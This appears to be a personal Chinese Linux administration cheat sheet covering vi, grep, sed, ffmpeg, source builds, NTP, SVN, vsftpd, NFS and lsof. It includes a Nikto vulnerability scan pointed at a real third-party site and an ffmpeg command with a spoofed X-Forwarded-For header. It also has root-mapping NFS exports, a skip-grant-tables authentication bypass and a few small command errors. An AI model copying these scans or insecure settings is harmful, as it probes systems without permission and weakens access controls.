O  在光标所在上方新建一行
o  在光标所在下方新建一行
Ctrl+f  屏幕前翻一页
Ctrl+b 屏幕后返一页
0 行首   $行尾
n<space>  光标右移n字符
n<Enter>  光标下移n行
xX删除字符
ndd删除光标以下n行
U撤销前一步动作
/pattern   查找并跳到匹配模式处，特殊字符要用”/”转义

# 复制粘贴
1、光标移到要复制的行首，yy复制单行，nyy向下复制n行；光标移到要粘贴的地方，p粘贴。
2、光标移到要复制的行首，v进入视图，hjkl选择复制区，y复制，p粘贴。
3、输入:n1,n2 co n3 表示将n1到n2行复制到n3行后面
4、输入:n1 n2 m  n3 表示将n1到n2行剪切到n3行后面

vi file1  #编辑file1
:e file2  #编辑file2
:e   #在两个文件之间切换
vi filename  #打开或新建文件，并将光标置于第一行首 
vi +n filename  #打开文件，并将光标置于第n行首 
vi + filename  #打开文件，并将光标置于最后一行首 
vi +/pattern filename  #打开文件，并将光标置于第一个与pattern匹配的串处 
vi -r filename  #在上次正用vi编辑时发生系统崩溃，恢复filename 
vi filename....filename #打开多个文件，依次进行编辑 
```

### grep的几个参数
`grep -l 模式 file` #查找文件file中是否匹配模式，匹配则输出文件名

`grep -l 模式 *`  #当前目录下所有文件

`grep -L 模式 *`  #查找不匹配的

`grep -c 模式 *`  #打印出匹配的行数

`grep -i 模式 *`  #忽略大小写

`grep -n 模式 *`  #显示匹配的行号

`grep -q 模式 *`  #不输出匹配结果

`grep -E 模式 *`  #正则和正则扩展

`grep -r 模式 *`  #递归查找

`grep -v 模式 *`  #输出不匹配的情况

`grep -l '关键词1' /usr/local/xxx.py | xargs grep -qE '关键词2'` #文本中包含多个关键词

`grep "xxx|aaa|bbb" *.txt`  #在当前目录下查找txt文件中含有xxx或aaa或bbb的文件

### sed的几个参数
```
sed [ -nefr] [n1, n2] action

-n  安静模式
-e  直接在命令行模式上进行sed的操作
-f  filename  将sed的操作写入文件
-r  使sed支持扩展正则表达式
n1, n2  选择要处理的行
action支持的参数
a  str 追加； c str 替换；  d  删除 '/regexp/d'
i  str  插入； p 打印； s  搜索/替换

cat -n /etc/passwd | sed '2,5d'  #显示除2到5行的passwd内容，
cat -n /etc/passwd | sed '2a fuck'  #显示passwd内容，第2行后加fuck
cat /etc/passwd | grep root | sed 's/^.* x//g'  #将开头到x的字符串替换为空
sed 's/^ * //g' filename  #删除行首空格
sed 's/pattern/& \n/g' filename  #行后添加新行，&代表pattern
sed 's/pattern/ \n&/g' filename  #行前添加新行
sed -e "s/$var1/Svar2/g" filename   #变量替换，双引号
sed -i '1 i\insert' filename  #在第一行插入文本
sed -i '$a\insert' filename  #在末行插入文本
sed -i '/pattern/i "fuck"' filename  #在匹配行前插入字符串
sed -i '/pattern/a "fuck"' filename #在匹配行后插入字符串
grep -v ^# filename | sed '/^ * $/d' | sed '/^ $/d'  #删除注释号以及空格空行

sed [-hnV] [-e <script>] [-f <script文件] [文本文件]

sed -e "s/aaa/bbb/g *.txt   #当前目录下txt文本替换所有 

sed -i "" "s/\/var\/web/\/home/g abc.txt   #-i表示插入

sed -n "/192.168/p" `grep 192.169 -rl *.txt`  #-n表示quite，递归

nl /etc/passwd #打印文件并带上行号
```

### ffmpeg
> 高速音视频转换器，采集，视频抓图，视频编辑等；

`ffmpeg -v 9 -loglevel 99 -headers "X-Forwarded-For: 160.53.186.194" -i http://pebbles112-lh.akamaihd.net/i/daserste_1@97481/index_900_av-p.m3u8?sd=6&b=0-1000&rebase=on` #指定headers

`ffmpeg -i video.avi` #-i是输入参数，获取视频信息

`ffmpeg -f image2 -i image%d.jpg video.mpg` #-f强制格式，将图片合成视频

`ffmpeg -i abc.flv -b:v 640k abc.mp4` #转成码率为640kbps的mp4

`ffmpeg -i abc.flv abc_%d.jpg` #将视频逐帧转为图片

`ffmpeg -i abc.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 abc.mp3` #从视频中抽出声音，存为mp3

### python安装pycurl模块
```
# 先下载安装curl
http://curl.haxx.se/download/curl-x.y.z.tar.gz
tar -zxvf curl-x.y.z.tar.gz
cd curl-x.y.z
./configure
make && make install

# 再下载安装pycurl
http://pycurl.sourceforge.NET/download/pycurl-x.y.z.tar.gz
tar -zxvf pycurl-x.y.z.tar.gz
cd pycurl-x.y.z
python setup.py install --curl-config=/usr/local/bin/curl-config
```

### 编译安装rarlinux,一定要找对版本
```
wget http://www.rarsoft.com/rar/rarlinux-x64-4.2.0.tar.gz 
tar -zxvf rarlinux-4.0.1.tar.gz 
cd rar 
make 

rar x xx.rar #解压xx.rar到当前目录
rar xx.rar ./xxx/  #将当前目录下的xxx目录打包成xx.rar
```

### ntp编译安装
```
wget https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.8p9.tar.gz
tar zxvf ntp-4.2.8p9.tar.gz
cd ntp-4.2.8p9
./configure --prefix=/usr/local/ntp --enable-all-clocks --enable-parse-clocks
make && make install

1. 修改配置
vi /etc/ntp.conf
若要允许任何IP客户机都能进行时间同步
restrict default nomodify
若只允许指定IP端同步
restrict default nomodify notrap noquery
restrict 192.168.18.0 mask 255.255.255.0 nomodify

2. 以守护进程启动ntpd
/usr/local/ntp/bin/ntpd -c /etc/ntp.conf -p /tmp/ntpd.pid

3.配置时间同步客户机
crontab -e
```

### 时间同步相关 
```
date -s 11:20:35   修改系统时间
date -s 11/09/13   修改系统日期
date -s "2013-08-08 12:00:00"  修改时间和日期
date -R   查看时区

clock -w  把系统时间写入CMOS

hwclock -w  把硬件时间写入CMOS
hwclock -show 查看硬件时间，即RTC
hwclock --hctosys  把硬件时间设为系统时间
hwclock --systohc  把系统时间设为硬件时间
hwclock --set --date=”mm/dd/yy hh:mm:ss” 设置硬件时间

/etc/localtime  本地时间配置文件
/etc/timezone   本地时区配置文件
/usr/share/zoneinfo  时区信息目录

ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && echo "Asia/Shanghai" > /etc/timezone

ntp.fudan.edu.cn  复旦大学ntp服务器
ntpdate 3.cn.pool.ntp.org  与网络时间服务器同步
ntpq -p 检查时间同步情况


crontab -e        添加crontab例行任务
0 0 */7 * * ntpdate time.domain.com && /sbin/hwclock -w 每隔7天执行一次，要写入bios才有效
```

### hosts.allow/deny配置
```
1. /etc/hosts.allow
sshd:192.168.1.0/255.255.255.0
telnetd:LOCAL

2. /etc/hosts.deny  #要和hosts.allow配合使用才生效
sshd:ALL  
telnetd:ALL
然后执行  ldd /usr/sbin/sshd | grep libwrap.so

3. /etc/ssh/sshd_config
Port 5000 #修改端口为5000
PermitRootLogin no  #禁止root登录
PasswordAuthentication yes  #允许密码认证
```

### webbench网站压力测试工具
```
wget http://homw.tiscali.cz/cz210552/distfiles/webbench-1.5.tar.gz
tar zxvf webbench-1.5.tar.gz
cd webbench-1.5.tar.gz
make
mkdir /usr/local/man
webbench -c 500 -t 30 http://127.0.0.1/   同时产生500个并发连接，持续30秒
```


### Nikto探测一个网站用到的技术
```
wget https://cirt.net/nikto/nikto-2.1.5.tar.gz
tar -zxvf nikto-2.1.5.tar.gz
cd nikto-2.1.5
perl ./nikto.pl -h www.baidu.com  #探测指定主机
perl ./nikto.pl -h 10.10.10.10 #扫描主机
perl ./nikto.pl -h 10.10.10.10 -p 443 -s -g #扫描主机443端口，强制使用ssl模式
perl ./nikto.pl -h 10.10.10.10 -p 80-90 #扫描80-90端口
```

## 安装配置Subversion
```
yum -y install subversion
rpm -ql subversion  #查看安装位置
svn  --help
svnserve --version   #查看版本信息
mkdir -p /opt/svn/svnrepos  #创建svn版本库目录
svnadmin create /opt/svn/svnrepos  #创建版本库
cd /opt/svn/svnrepos/conf   #进入conf目录
# authz文件是权限控制文件
# passwd是帐号密码文件
# svnserve.conf是svn服务配置文件

vi passwd   #设置帐号密码

passwd
[users]
用户名 = 密码
authz
[路径]
用户名=rw

svnserve.conf
[general]
anon-access = read  #匿名用户可读(若版本比较时报错，就修改为none)
auth-access = write  #授权用户可写
password-db = passwd  #帐号文件
authz-db = authz  #权限文件
realm = /opt/svn/svnrepos  #认证空间名，版本库所在目录

启动服务 svnserve -d -r /opt/svn/svnrepos [--listen-port 3690]

lsof -i:3690  #查看端口

连接方式： svn://ip:port

killall -HUP svnserve  #杀死进程
```

## vsftp 安装配置
```
vsftpd.conf
anonymous_enable=NO  #不允许匿名
local_enable=YES  #允许本地访问
write_enable=YES  #可写
local_umask=022  #755权限
file_open_mode=0755   
dirmessage_enable=YES  #登录后的路径信息
anon_upload_enable=NO   #匿名上传
anon_mkdir_write_enable=NO  #匿名创建文件夹
xferlog_enable=YES  #日志
connect_from_port_20=YES
xferlog_std_format=YES
ascii_upload_enable=YES
ascii_download_enable=YES
chroot_local_user=YES
chroot_list_enable=NO
chroot_list_file=/etc/vsftpd/chroot_list  #该文件默认是不存在的，需手动创建
listen=YES
pam_service_name=vsftpd
userlist_enable=YES  #启用user_list文件
userlist_deny=NO    #user_list文件中的用户可登录
tcp_wrappers=YES
isolate_network=NO
pasv_enable=YES

# vi /etc/vsftpd/user_list    #该文件里写用户名，一行一个
ftptest

useradd -d /opt/www -s /sbin/nologin -g ftp ftptest  #创建普通ftp用户
passwd ftptest   #设置密码

注意：若无法获取目录列表，检查selinux是否禁止，iptables是否开启端口。

# 开启iptables之后ftp无法显示目录列表
vi /etc/sysconfig/iptables-config  添加
IPTABLES_MODULES="ip_conntrack_ftp"
IPTABLES_MODULES="ip_nat_ftp"
# 或者临时加载模块
modprobe ip_conntrack_ftp
modprobe ip_nat_ftp
```

## 升级[openssh](ftp://mirror.internode.on.net/pub/OpenBSD/OpenSSH/portable/)到7.6p1 (2017-10-11 )

- 下载最新版本并解压编译安装

`tar zxvf openssh-7.6p1.tar.gz`

`cd openssh-7.6p1`

`./configure --prefix=/usr/local/openssh-7.6p1 --with-pam=enable --with-ssl-dir=/usr/local/ssl`

> 注意：若报错 pam header not found, 则需要yum -y install pam-devel; 若报错zlib missing, 则需要yum -y install zlib-devel

`make && make install`

- 先停掉sshd服务(centos6下 service sshd stop, centos7下 systemctl stop sshd.service)

`/usr/local/openssh-7.6p1/bin/*` 覆盖 `/usr/bin/` 目录下的同名文件, 注意覆盖前先备份

`/usr/local/openssh-7.6p1/sbin/*` 覆盖 `/usr/sbin/` 目录下同名文件, 注意覆盖前先备份

备份`/etc/init.d/sshd`, 用当前目录下的`opensshd.init`覆盖 `/etc/init.d/sshd` (centos7系统忽略)

如果某个文件无法覆盖, 则先删除再覆盖(别怕, 你都备份了还怕什么)

- 启动sshd服务

`service start sshd` 或 `systemctl start sshd.service`

`ssh -V`

> 注：openssh依赖于openssl, 先把openssl升级到最新版本, 再升级openssh.

<br/>

## 升级[openssl](https://www.openssl.org/source/)到1.0.2l (2017-10-11)

- 下载最新版本并解压安装

`tar zxvf openssl-1.0.2l.tar.gz`

`cd openssl-1.0.2l`

`./config shared`  #可以指定安装路径`--prefix=/usr/local/openssl-1.0.2l`, 不指定则默认安装在`/usr/local/ssl`

`make`

`make test`

`make install`

- 替换旧版本

`mv /usr/bin/openssl /usr/bin/openssl.bak`

`mv /usr/include/openssl /usr/include/openssl.bak`

`ln -s /usr/local/ssl/bin/openssl /usr/bin/openssl`

`ln -s /usr/local/ssl/include/openssl /usr/include/openssl`

`echo "/usr/local/ssl/lib" >> /etc/ld.so.conf`

`ldconfig`

- 验证新版本

`openssl version`


## jar打包的一些命令

```
1.jar打包命令

jar -cvf xx.jar *.* 

说明一下：*.*表示把当前目录下面以及子目录的所有class都打到这个xx.jar里。

-cvf的含义，可以自己去用jar命令去查看

如果要单独对某个或某些class文件进行打包，可以这样：

jar -cvf xx.jar Foo.class Bar.class 


2.运行jar

java -jar xx.jar

要运行一个jar，则此jar内部的META-INF\MANIFEST.MF文件里必须指明要执行的main方法类

具体格式如：

Manifest-Version: 1.0
Created-By: 1.6.0_03 (Sun Microsystems Inc.)
Main-class: Test 

如果此处的Test.class在com.xx包下面，则需要指明。

如果在运行时报了invalid or corrupt jarfile错误，则需要检查Main-class: Test 之间是不是缺少了空格。


3.指定运行jar里面的class
java -cp xx.jar com.xx.Test

4.编译某个java文件，但是依赖某个jar

javac -cp xx.jar Test.java

 (Test.java里面import了xx.jar里面的某个class)


5.运行某个java文件，但是依赖某个jar
java -cp .;xx.jar Test

注意：引用xx.jar的时候，不要漏掉.;（这个表示当前目录）

举例：

test.java 引用了第三方包，如果要在cmd下执行test.java

javac -cp .;mysql-connector-java.jar test.java  #编译

java -cp .;mysql-connector-java.jar test   #执行
```

### nfs相关

```
一. 服务端10.1.10.1

yum install -y nfs-utils

vim /etc/exports
/home/nfs 10.1.10.10(rw,sync,no_root_squash)  10.1.10.11(ro,async,no_root_squash,fsid=0) #fsid表示将/home/nfs作为根目录
/home/nfs1 10.1.10.0/24(rw,sync,all_squash,anonuid=0,anongid=0)  #id root可查看到root用户的id
# 配置立即生效
exportfs –arv
# 允许服务
systemctl enable rpcbind.service    
systemctl enable nfs-server.service
# 启动服务
systemctl start rpcbind.service    
systemctl start nfs-server.service 

# 确认服务
rpcinfo -p
showmount -e 10.1.10.1

# 防火墙端口相关
iptables -I INPUT -p tcp -m multiport --dports 111,892,2049 -j ACCEPT
iptables -I INPUT -p udp -m multiport --dports 111,892 -j ACCEPT

二. 客户端10.1.10.10/11

yum install -y nfs-utils

# 启动rpcbind服务
systemctl enable rpcbind.service
systemctl start rpcbind.service

# 检查 NFS 服务器端是否有目录共享
showmount -e 10.1.10.1

# 挂载nfs
mount -t nfs 10.1.10.1:/home/nfs/ /home/nfs/

# 开机挂载
vim /etc/fstab
10.1.10.1:/home/nfs /home/nfs nfs nolock 0 0
10.1.10.1:/home/nfs1 /home/nfs1 nfs nolock 0 0

# 重新挂载
mount -a
```


# 先安装Python3.6的依赖

`yum install -y gcc zlib-devel openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel sqlite-devel ncurses-devel make autoconf automake`

# 下载源码包

`wget https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tgz`

# 解压编译安装

`tar zxvf Python-3.6.2.tgz`

`cd Python-3.6.2`

`./configure --prefix=/usr/local/python36`

`make -j 4`

`make install`

# 一般而言, python3.6相关命令会在/usr/local/bin目录下有软链

# 对于CentOS7自带的Python2.7.x, 没有pip

`yum install -y epel-release`

`yum install python-pip`

**linux下查看进程打开的文件句柄数**

`lsof -n | awk '{print $2}' | sort | uniq -c | sort -nr` #按进程统计, 第一列是句柄数, 第二列进程id

`lsof -n | awk '{print $5}' | sort | uniq -c | sort -nr` #按句柄类型统计, 其中REG代表文件

`lsof | wc -l` #查看总文件句柄数

`lsof -p pid | wc -l` #指定进程打开的文件句柄数

`lsof | grep IPv4 | wc -l` #查看网络句柄数

`lsof | grep TCP | wc -l`

`ulimit -n` #系统默认最大句柄数

`ulimit -HSn 4096` #修改最大句柄数, H指定了硬性大小, S指定了软性大小, n指定了单个进程最大的打开文件句柄数

**忘记了mariadb的root密码**

> 先停止服务`systemctl stop mariadb`, 找到配置文件`/etc/my.cnf`, 在`[mysqld]`段添加`skip-grant-tables`, 启动服务, 进入命令行更新密码即可.

**/boot空间不足的解决办法**

- umount /boot
- mkdir /boot_old
- mount /dev/sda1 /boot_old
- cp -rp /boot_old/* /boot
- 删除/etc/fstab中含有/boot的项

